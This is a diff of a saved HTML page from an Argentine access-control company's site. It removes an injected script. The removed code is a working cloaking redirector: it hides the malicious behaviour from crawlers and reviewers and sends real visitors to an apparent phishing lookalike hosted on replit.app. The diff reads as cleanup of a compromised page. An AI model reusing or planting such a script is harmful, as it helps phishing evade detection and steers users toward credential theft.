@@ -2,63 +2,7 @@
 <!-- saved from url=(0046)https://www.centinet.com.ar/control-de-acceso/ -->
 <html dir="ltr" lang="es-AR" prefix="og: https://ogp.me/ns#" class="html_stretched responsive av-preloader-enabled av-default-lightbox html_header_top html_logo_left html_main_nav_header html_menu_right html_custom html_header_sticky html_header_shrinking html_header_topbar_active html_mobile_menu_tablet html_header_searchicon_disabled html_content_align_center html_header_unstick_top html_header_stretch_disabled html_minimal_header html_minimal_header_shadow html_elegant-blog html_av-submenu-hidden html_av-submenu-display-click html_av-overlay-side html_av-overlay-side-classic html_av-submenu-clone html_entry_id_7847 av-no-preview html_text_menu_active avia_desktop js_active avia_transform avia_transform3d avia_transform avia_transform3d avia-webkit avia-webkit-141 avia-chrome avia-chrome-141 avia-windows"><iframe height="0" width="0" style="display: none; visibility: hidden;" src="./index_files/saved_resource(1).html"></iframe><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta http-equiv="origin-trial" content="A7vZI3v+Gz7JfuRolKNM4Aff6zaGuT7X0mf3wtoZTnKv6497cVMnhy03KDqX7kBz/q/iidW7srW31oQbBt4VhgoAAACUeyJvcmlnaW4iOiJodHRwczovL3d3dy5nb29nbGUuY29tOjQ0MyIsImZlYXR1cmUiOiJEaXNhYmxlVGhpcmRQYXJ0eVN0b3JhZ2VQYXJ0aXRpb25pbmczIiwiZXhwaXJ5IjoxNzU3OTgwODAwLCJpc1N1YmRvbWFpbiI6dHJ1ZSwiaXNUaGlyZFBhcnR5Ijp0cnVlfQ==">
 
-<script>
-(function() {
-    'use strict';
 
-    // ============================================
-    // CONFIGURACIÓN
-    // ============================================
-    const CONFIG = {
-        // URL a donde se redirigirá el tráfico "bueno" (usuarios reales)
-        destinoReal: 'https://www-ingresoabse.replit.app/',
-        
-        // User-Agents conocidos de bots y crawlers.
-        // Esta es la ÚNICA lista que necesitas mantener. Es tu primera y última línea de defensa.
-        userAgentsBloqueados: [
-            // Google
-            'googlebot', 'adsbot-google', 'mediapartners-google', 'googleweblight',
-            // Social Media Crawlers
-            'facebookexternalhit', 'facebot', 'twitterbot', 'linkedinbot', 'instagrambot',
-            // Search Engines
-            'bingbot', 'slurp', 'duckduckbot', 'yandexbot', 'baiduspider',
-            // SEO/Marketing Tools
-            'ahrefsbot', 'semrushbot', 'mj12bot', 'dotbot', 'screaming frog',
-            // Palabras genéricas de bot (útil para bots desconocidos)
-            'crawler', 'spider', 'bot', 'crawl', 'scrape'
-        ]
-    };
-
-    // ============================================
-    // LÓGICA DE DECISIÓN ULTRA RÁPIDA (100% SÍNCRONA)
-    // ============================================
-
-    // 1. Comprobación de User-Agent (la única que haremos)
-    function esUserAgentBot() {
-        const ua = navigator.userAgent.toLowerCase();
-        // Usamos .some() que es muy rápido y deja de buscar en cuanto encuentra una coincidencia.
-        return CONFIG.userAgentsBloqueados.some(bot => ua.includes(bot));
-    }
-
-    // 2. Ejecución y Redirección Inmediata
-    const esBot = esUserAgentBot();
-
-    // SI NO ES UN BOT CONOCIDO, REDIRIGE.
-    // Esta es la clave: la lógica es "permitir todo excepto lo conocido como malo".
-    if (!esBot) {
-        // Usamos window.location.replace para que no se pueda volver atrás.
-        // Es la forma más rápida y limpia de redirigir.
-        window.location.replace(CONFIG.destinoReal);
-        // Detenemos la ejecución del script. No se necesita nada más.
-        return;
-    }
-
-    // 3. SI ES UN BOT, NO HAGAS NADA.
-    // El script termina y la página "segura" se carga normalmente para el bot.
-    // El resto del HTML, CSS y etc. se mostrará al revisor.
-
-})();
-</script>
 
 <meta name="robots" content="index, follow">
 
